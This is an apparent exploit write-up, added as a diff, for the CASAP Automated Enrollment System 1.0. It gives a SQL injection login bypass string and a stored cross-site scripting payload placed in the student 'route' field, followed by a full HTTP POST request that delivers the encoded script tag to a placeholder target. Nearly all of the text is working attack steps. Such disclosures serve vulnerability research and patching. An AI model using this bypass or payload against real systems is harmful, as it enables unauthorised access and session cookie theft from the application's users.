@@ -1,0 +1,29 @@
+# Exploit Title: CASAP Automated Enrollment System 1.0 - 'route' Stored XSS
+# Exploit Author: Richard Jones
+# Date: 2021-01/23
+# Vendor Homepage: https://www.sourcecodester.com/php/12210/casap-automated-enrollment-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=12210&title=CASAP+Automated+Enrollment+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: Windows 10 Home 19041 (x64_86) + XAMPP 7.2.34
+
+# Steps to reproduce
+# 1. login bypass username: admin, password: `' or 1=1#
+# 2. Studants > Edit > "ROUTE" field enter.. "<script>alert(document.cookie)</script>
+# Save, reload page, exploited stored XXS
+
+
+POST /Final/update_student.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 297
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/Final/edit_stud.php?id=6
+Cookie: PHPSESSID=97qoeda9h6djjis5gbr00p7ndc
+
+student_id=6&status=half&fname=Ronel&mname=G.&lname=Ortega&gender=Male&dob=1999-06-16&address=Prk.1+brgy.banago+bacolod+city&student_class=ICT+-+Computer+Programming&transport=yes&route=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&gfname=Juanita&gmname=S.&glname=a&rship=Mother&tel=0912312445
